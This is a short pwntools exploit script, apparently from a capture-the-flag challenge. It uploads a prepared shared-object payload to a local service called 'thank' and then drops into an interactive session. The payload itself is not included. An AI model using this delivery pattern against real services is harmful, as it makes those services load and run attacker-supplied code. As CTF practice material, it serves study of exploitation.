from pwn import *

with open("payload.so", "rb") as fi:
    payload = fi.read()

if args.LOCAL:
    p = process("./thank")
else:
    p = remote("localhost", 5000)

p.recvuntil(b"What is the size of your file (in bytes)?")
p.sendline(str(len(payload)).encode())

p.recvuntil(b"Send your file!\n")
p.send(payload)

p.interactive()